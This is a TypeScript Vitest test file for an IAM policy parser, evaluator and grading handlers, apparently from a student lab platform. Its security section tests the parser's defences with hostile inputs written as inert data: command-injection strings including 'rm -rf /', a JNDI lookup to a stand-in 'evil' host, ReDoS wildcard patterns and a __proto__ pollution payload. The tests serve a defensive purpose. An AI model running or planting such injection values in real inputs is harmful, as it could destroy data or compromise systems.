/**
 * IAM policy parsing and semantic evaluation.
 *
 * The property under test throughout: **meaning is graded, spelling is not.**
 * Every "same policy, written differently" case below must reach the same
 * verdict, and every "looks similar, means something else" case must not.
 */
import { describe, expect, it } from 'vitest';
import {
  IamPolicyParseError,
  evaluateIamPolicy,
  findStatements,
  matchesIamPattern,
  parseIamPolicy,
  statementHasCondition,
  wildcardStatements,
} from '../src/iam-policy.js';
import { verifyRequirement } from '../src/registry.js';
import { SandboxReader, type SandboxPort } from '../src/sandbox-reader.js';
import type { SandboxPathRead } from '@jumptotech/lab-orchestrator';

const BUCKET = 'arn:aws:s3:::jumptotech-ledger-exports';
const OBJECTS = 'arn:aws:s3:::jumptotech-ledger-exports/*';

// ------------------------------------------------------------ normalization

describe('normalization — the same policy written differently', () => {
  const canonical = JSON.stringify({
    Version: '2012-10-17',
    Statement: [
      { Sid: 'Read', Effect: 'Allow', Action: ['s3:GetObject'], Resource: [OBJECTS] },
      { Sid: 'List', Effect: 'Allow', Action: ['s3:ListBucket'], Resource: [BUCKET] },
    ],
  });

  it('ignores JSON key order', () => {
    const reordered = JSON.stringify({
      Statement: [
        { Resource: [OBJECTS], Action: ['s3:GetObject'], Sid: 'Read', Effect: 'Allow' },
        { Effect: 'Allow', Resource: [BUCKET], Sid: 'List', Action: ['s3:ListBucket'] },
      ],
      Version: '2012-10-17',
    });

    expect(parseIamPolicy(reordered).statements.map((s) => s.sid)).toEqual(['Read', 'List']);
    expect(evaluateIamPolicy(parseIamPolicy(reordered), { action: 's3:GetObject', resource: OBJECTS }))
      .toBe(evaluateIamPolicy(parseIamPolicy(canonical), { action: 's3:GetObject', resource: OBJECTS }));
  });

  it('ignores whitespace and indentation', () => {
    const pretty = JSON.stringify(JSON.parse(canonical), null, 4);
    const packed = JSON.stringify(JSON.parse(canonical));

    expect(parseIamPolicy(pretty)).toEqual(parseIamPolicy(packed));
  });

  it('ignores statement order', () => {
    const swapped = JSON.stringify({
      Version: '2012-10-17',
      Statement: [
        { Sid: 'List', Effect: 'Allow', Action: ['s3:ListBucket'], Resource: [BUCKET] },
        { Sid: 'Read', Effect: 'Allow', Action: ['s3:GetObject'], Resource: [OBJECTS] },
      ],
    });

    for (const policy of [canonical, swapped]) {
      expect(evaluateIamPolicy(parseIamPolicy(policy), { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
      expect(evaluateIamPolicy(parseIamPolicy(policy), { action: 's3:ListBucket', resource: BUCKET })).toBe('allow');
    }
  });

  it('treats Action as a string and as a one-element array identically', () => {
    const asString = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:GetObject', Resource: OBJECTS } }),
    );
    const asArray = parseIamPolicy(
      JSON.stringify({ Statement: [{ Effect: 'Allow', Action: ['s3:GetObject'], Resource: [OBJECTS] }] }),
    );

    expect(asString.statements[0]!.actions).toEqual(['s3:GetObject']);
    expect(asArray.statements[0]!.actions).toEqual(['s3:GetObject']);
    expect(evaluateIamPolicy(asString, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
    expect(evaluateIamPolicy(asArray, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
  });

  it('treats Resource as a string and as a one-element array identically', () => {
    const asString = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:GetObject', Resource: OBJECTS } }),
    );

    expect(asString.statements[0]!.resources).toEqual([OBJECTS]);
    expect(evaluateIamPolicy(asString, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
  });

  it('accepts a single statement written as an object rather than an array', () => {
    const policy = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: '*', Resource: '*' } }),
    );

    expect(policy.statements).toHaveLength(1);
  });

  it('normalises Effect case, because the meaning is the same', () => {
    const policy = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'allow', Action: 's3:GetObject', Resource: OBJECTS } }),
    );

    expect(policy.statements[0]!.effect).toBe('Allow');
  });
});

// -------------------------------------------------------------- wildcards

describe('wildcard matching follows IAM, not regular expressions', () => {
  it('expands * and ?', () => {
    expect(matchesIamPattern('s3:Get*', 's3:GetObject')).toBe(true);
    expect(matchesIamPattern('s3:Get*', 's3:PutObject')).toBe(false);
    expect(matchesIamPattern('s3:GetObjec?', 's3:GetObject')).toBe(true);
    expect(matchesIamPattern('*', 'anything:AtAll')).toBe(true);
  });

  it('treats regex metacharacters in an ARN as literal text', () => {
    const arn = 'arn:aws:s3:::my.bucket+name';
    expect(matchesIamPattern(arn, arn, { caseSensitive: true })).toBe(true);
    expect(matchesIamPattern('arn:aws:s3:::my.bucket+name', 'arn:aws:s3:::myXbucket+name', { caseSensitive: true })).toBe(false);
  });

  it('matches actions case-insensitively and ARNs case-sensitively', () => {
    expect(matchesIamPattern('s3:getobject', 's3:GetObject')).toBe(true);
    expect(matchesIamPattern(BUCKET.toUpperCase(), BUCKET, { caseSensitive: true })).toBe(false);
  });

  it('finds a bare * in Action and in Resource', () => {
    const policy = parseIamPolicy(
      JSON.stringify({
        Statement: [
          { Sid: 'Wide', Effect: 'Allow', Action: '*', Resource: '*' },
          { Sid: 'Narrow', Effect: 'Allow', Action: 's3:GetObject', Resource: OBJECTS },
        ],
      }),
    );

    expect(wildcardStatements(policy, 'Action').map((s) => s.sid)).toEqual(['Wide']);
    expect(wildcardStatements(policy, 'Resource').map((s) => s.sid)).toEqual(['Wide']);
    expect(wildcardStatements(policy, 'Action', 'Deny')).toEqual([]);
    // `s3:*` is a wildcard *pattern* but not the bare `*` this check is about.
    const scoped = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:*', Resource: OBJECTS } }),
    );
    expect(wildcardStatements(scoped, 'Action')).toEqual([]);
  });
});

// ------------------------------------------------------------- evaluation

describe('evaluation follows the documented rule', () => {
  it('grants when an Allow matches', () => {
    const policy = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:*', Resource: OBJECTS } }),
    );
    expect(evaluateIamPolicy(policy, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
  });

  it('implicitly denies what nothing mentions', () => {
    const policy = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:GetObject', Resource: OBJECTS } }),
    );
    expect(evaluateIamPolicy(policy, { action: 's3:DeleteObject', resource: OBJECTS })).toBe('implicitDeny');
    expect(evaluateIamPolicy(policy, { action: 's3:GetObject', resource: 'arn:aws:s3:::other/*' })).toBe('implicitDeny');
  });

  it('lets an explicit Deny beat an Allow, whatever the statement order', () => {
    const denyLast = parseIamPolicy(
      JSON.stringify({
        Statement: [
          { Effect: 'Allow', Action: 's3:*', Resource: '*' },
          { Effect: 'Deny', Action: 's3:DeleteObject', Resource: '*' },
        ],
      }),
    );
    const denyFirst = parseIamPolicy(
      JSON.stringify({
        Statement: [
          { Effect: 'Deny', Action: 's3:DeleteObject', Resource: '*' },
          { Effect: 'Allow', Action: 's3:*', Resource: '*' },
        ],
      }),
    );

    for (const policy of [denyLast, denyFirst]) {
      expect(evaluateIamPolicy(policy, { action: 's3:DeleteObject', resource: OBJECTS })).toBe('explicitDeny');
      expect(evaluateIamPolicy(policy, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
    }
  });

  it('honours NotAction and NotResource', () => {
    const notAction = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', NotAction: 's3:DeleteObject', Resource: '*' } }),
    );
    expect(evaluateIamPolicy(notAction, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
    expect(evaluateIamPolicy(notAction, { action: 's3:DeleteObject', resource: OBJECTS })).toBe('implicitDeny');

    const notResource = parseIamPolicy(
      JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:*', NotResource: 'arn:aws:s3:::secret/*' } }),
    );
    expect(evaluateIamPolicy(notResource, { action: 's3:GetObject', resource: OBJECTS })).toBe('allow');
    expect(evaluateIamPolicy(notResource, { action: 's3:GetObject', resource: 'arn:aws:s3:::secret/x' })).toBe('implicitDeny');
  });

  it('refuses a statement with neither Resource nor NotResource, as the docs require', () => {
    expect(() => parseIamPolicy(JSON.stringify({ Statement: { Effect: 'Allow', Action: 's3:*' } })))
      .toThrow(/neither Resource nor NotResource/);
  });
});

// -------------------------------------------------------------- conditions

describe('conditions', () => {
  const policy = parseIamPolicy(
    JSON.stringify({
      Statement: {
        Effect: 'Allow',
        Action: 's3:PutObject',
        Resource: OBJECTS,
        Condition: {
          StringEquals: { 's3:x-amz-server-side-encryption': 'aws:kms' },
          Bool: { 'aws:SecureTransport': true },
        },
      },
    }),
  );

  it('normalises a bare string and a boolean into a value list', () => {
    const statement = policy.statements[0]!;
    expect(statement.conditions).toHaveLength(2);
    expect(statement.conditions.find((c) => c.operator === 'Bool')?.values).toEqual(['true']);
  });

  it('matches on operator and key, and optionally on value', () => {
    const statement = policy.statements[0]!;
    expect(statementHasCondition(statement, { operator: 'StringEquals', key: 's3:x-amz-server-side-encryption' })).toBe(true);
    expect(statementHasCondition(statement, { operator: 'StringEquals', key: 's3:x-amz-server-side-encryption', value: 'aws:kms' })).toBe(true);
    expect(statementHasCondition(statement, { operator: 'StringEquals', key: 's3:x-amz-server-side-encryption', value: 'AES256' })).toBe(false);
    expect(statementHasCondition(statement, { operator: 'StringLike', key: 's3:x-amz-server-side-encryption' })).toBe(false);
  });

  it('selects statements by condition', () => {
    expect(findStatements(policy, { condition: { operator: 'Bool', key: 'aws:SecureTransport', value: 'true' } })).toHaveLength(1);
    expect(findStatements(policy, { condition: { operator: 'Bool', key: 'aws:SecureTransport', value: 'false' } })).toHaveLength(0);
  });
});

// ------------------------------------------------------------ invalid input

describe('documents that are not IAM policies are refused with a reason', () => {
  const cases: Array<[string, string, string]> = [
    ['not JSON at all', 'this is not json {', 'not valid JSON'],
    ['a JSON array', '[]', 'must be a JSON object'],
    ['no Statement', '{"Version":"2012-10-17"}', 'no Statement'],
    ['empty Statement list', '{"Statement":[]}', 'empty Statement'],
    ['a statement with no Effect', '{"Statement":[{"Action":"s3:*"}]}', 'no Effect'],
    ['an unknown Effect', '{"Statement":[{"Effect":"Maybe","Action":"s3:*"}]}', 'neither Allow nor Deny'],
    ['no Action or NotAction', '{"Statement":[{"Effect":"Allow","Resource":"*"}]}', 'neither Action nor NotAction'],
    ['no Resource or NotResource', '{"Statement":[{"Effect":"Allow","Action":"s3:*"}]}', 'neither Resource nor NotResource'],
    ['both Action and NotAction', '{"Statement":[{"Effect":"Allow","Action":"s3:*","NotAction":"s3:Delete*","Resource":"*"}]}', 'both Action and NotAction'],
    ['a non-string action', '{"Statement":[{"Effect":"Allow","Action":[1],"Resource":"*"}]}', 'only strings'],
    ['a non-object Condition', '{"Statement":[{"Effect":"Allow","Action":"s3:*","Resource":"*","Condition":"nope"}]}', 'Condition must be an object'],
  ];

  for (const [name, text, reason] of cases) {
    it(`refuses ${name}`, () => {
      expect(() => parseIamPolicy(text)).toThrow(IamPolicyParseError);
      expect(() => parseIamPolicy(text)).toThrow(new RegExp(reason.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
    });
  }
});

// ------------------------------------------------- handlers, through the reader

class FakeSandbox implements SandboxPort {
  constructor(private readonly entries: Record<string, string>) {}
  async read(relativePath: string): Promise<SandboxPathRead | null> {
    const content = this.entries[relativePath];
    if (content === undefined) return null;
    return { type: 'file', mode: '644', owner: 'student', group: 'student', sizeBytes: content.length, content };
  }
}

const POLICY_PATH = '/home/student/policy.json';
const reader = (content: string) => new SandboxReader(new FakeSandbox({ [POLICY_PATH]: content }));

const LEAST_PRIVILEGE = JSON.stringify({
  Version: '2012-10-17',
  Statement: [
    { Sid: 'ReadObjects', Effect: 'Allow', Action: ['s3:GetObject'], Resource: [OBJECTS] },
    {
      Sid: 'Upload',
      Effect: 'Allow',
      Action: 's3:PutObject',
      Resource: OBJECTS,
      Condition: { StringEquals: { 's3:x-amz-server-side-encryption': 'aws:kms' } },
    },
  ],
});

describe('the handlers grade through the same model', () => {
  it('passes a valid document and fails an invalid one without crashing', async () => {
    const ok = await verifyRequirement({ type: 'iam_policy_document', path: POLICY_PATH, version: '2012-10-17' }, reader(LEAST_PRIVILEGE));
    expect(ok.status).toBe('pass');

    const bad = await verifyRequirement({ type: 'iam_policy_document', path: POLICY_PATH }, reader('{ not json'));
    expect(bad.status).toBe('fail');
    expect(bad.detail).toContain('not valid JSON');
  });

  it('reports a missing file rather than throwing', async () => {
    const result = await verifyRequirement(
      { type: 'iam_policy_document', path: '/home/student/absent.json' },
      reader(LEAST_PRIVILEGE),
    );
    expect(result.status).toBe('fail');
  });

  it('finds a statement by effect, action, resource and condition', async () => {
    const found = await verifyRequirement(
      {
        type: 'iam_policy_statement',
        path: POLICY_PATH,
        effect: 'Allow',
        actions: ['s3:PutObject'],
        resources: [OBJECTS],
        condition: { operator: 'StringEquals', key: 's3:x-amz-server-side-encryption', value: 'aws:kms' },
      },
      reader(LEAST_PRIVILEGE),
    );
    expect(found.status).toBe('pass');

    const wrongValue = await verifyRequirement(
      {
        type: 'iam_policy_statement',
        path: POLICY_PATH,
        effect: 'Allow',
        actions: ['s3:PutObject'],
        condition: { operator: 'StringEquals', key: 's3:x-amz-server-side-encryption', value: 'AES256' },
      },
      reader(LEAST_PRIVILEGE),
    );
    expect(wrongValue.status).toBe('fail');
    expect(wrongValue.detail).toContain('condition');
  });

  it('evaluates allow and not-allow', async () => {
    const allows = await verifyRequirement(
      { type: 'iam_policy_allows', path: POLICY_PATH, action: 's3:GetObject', resource: OBJECTS },
      reader(LEAST_PRIVILEGE),
    );
    expect(allows.status).toBe('pass');

    const notAllows = await verifyRequirement(
      { type: 'iam_policy_not_allows', path: POLICY_PATH, action: 's3:DeleteObject', resource: OBJECTS },
      reader(LEAST_PRIVILEGE),
    );
    expect(notAllows.status).toBe('pass');

    const overbroad = JSON.stringify({ Statement: { Effect: 'Allow', Action: '*', Resource: '*' } });
    const leaked = await verifyRequirement(
      { type: 'iam_policy_not_allows', path: POLICY_PATH, action: 's3:DeleteObject', resource: OBJECTS },
      reader(overbroad),
    );
    expect(leaked.status).toBe('fail');
  });

  it('rejects the bare wildcard and accepts a scoped one', async () => {
    const clean = await verifyRequirement(
      { type: 'iam_policy_no_wildcard', path: POLICY_PATH, field: 'Action' },
      reader(LEAST_PRIVILEGE),
    );
    expect(clean.status).toBe('pass');

    const wide = JSON.stringify({ Statement: { Sid: 'TooWide', Effect: 'Allow', Action: '*', Resource: '*' } });
    const flagged = await verifyRequirement(
      { type: 'iam_policy_no_wildcard', path: POLICY_PATH, field: 'Resource' },
      reader(wide),
    );
    expect(flagged.status).toBe('fail');
    expect(flagged.detail).toContain('TooWide');
  });
});

// ------------------------------------------------------------- security

describe('the parser is safe against a hostile policy document', () => {
  /**
   * The regression this pins: an earlier implementation translated IAM
   * wildcards into a regular expression, and `^a.*a.*a.*b$` backtracks
   * catastrophically. The verifier runs inside the API process, so a policy
   * like this was a denial of service against every other student, not merely
   * a slow check. The matcher is linear now; these must return in milliseconds.
   */
  it('cannot be made to hang by a wildcard-dense pattern', () => {
    const hostile: Array<[string, string]> = [
      ['a' + '*a'.repeat(30) + '*b', 'a'.repeat(300)],
      ['*?'.repeat(40) + 'b', 'a'.repeat(300)],
      ['*' + 'ab'.repeat(50) + '*', 'ab'.repeat(200) + 'c'],
      ['*'.repeat(200) + 'z', 'y'.repeat(500)],
    ];

    // Whether each one matches is beside the point — that it *returns* is the
    // property under test.
    const started = Date.now();
    for (const [pattern, value] of hostile) {
      expect(typeof matchesIamPattern(pattern, value)).toBe('boolean');
    }
    expect(Date.now() - started).toBeLessThan(1000);
  });

  it('evaluates a hostile policy end to end without hanging', () => {
    const policy = parseIamPolicy(
      JSON.stringify({
        Statement: {
          Effect: 'Allow',
          Action: 's3:' + '*a'.repeat(30) + '*b',
          Resource: 'arn:aws:s3:::' + '*x'.repeat(30) + '*y',
        },
      }),
    );

    const started = Date.now();
    expect(evaluateIamPolicy(policy, { action: 's3:' + 'a'.repeat(200), resource: 'arn:aws:s3:::' + 'x'.repeat(200) }))
      .toBe('implicitDeny');
    expect(Date.now() - started).toBeLessThan(1000);
  });

  it('does not execute or evaluate anything the policy contains', () => {
    // Values that would matter only to something that executed them.
    const policy = parseIamPolicy(
      JSON.stringify({
        Statement: {
          Effect: 'Allow',
          Action: '$(touch /tmp/pwned)',
          Resource: '`id`; rm -rf /',
          Condition: { StringEquals: { 'aws:PrincipalTag/x': '${jndi:ldap://evil}' } },
        },
      }),
    );

    // They are inert data, compared as text and nothing more.
    expect(policy.statements[0]!.actions).toEqual(['$(touch /tmp/pwned)']);
    expect(evaluateIamPolicy(policy, { action: 's3:GetObject', resource: 'arn:aws:s3:::b/x' })).toBe('implicitDeny');
  });

  it('does not let a __proto__ key pollute anything', () => {
    const policy = parseIamPolicy(
      '{"Statement":[{"Effect":"Allow","Action":"s3:*","Resource":"*","Condition":{"__proto__":{"polluted":"yes"}}}]}',
    );

    expect(policy.statements[0]!.conditions.map((c) => c.operator)).toContain('__proto__');
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.prototype).not.toHaveProperty('polluted');
  });

  it('refuses a deeply nested document rather than recursing into it', () => {
    let nested = '{"a":1}';
    for (let depth = 0; depth < 2000; depth += 1) nested = `{"a":${nested}}`;

    // Either it parses to something that is not a policy, or JSON.parse
    // refuses it. Both are a clean IamPolicyParseError, never a crash.
    expect(() => parseIamPolicy(nested)).toThrow(IamPolicyParseError);
  });

  it('treats a policy that is an enormous flat array as ordinary input', () => {
    const many = Array.from({ length: 500 }, (_, i) => ({
      Sid: `S${i}`,
      Effect: 'Allow',
      Action: `s3:Action${i}`,
      Resource: `arn:aws:s3:::bucket${i}/*`,
    }));

    const started = Date.now();
    const policy = parseIamPolicy(JSON.stringify({ Statement: many }));
    expect(policy.statements).toHaveLength(500);
    expect(evaluateIamPolicy(policy, { action: 's3:Action499', resource: 'arn:aws:s3:::bucket499/x' })).toBe('allow');
    expect(Date.now() - started).toBeLessThan(2000);
  });
});
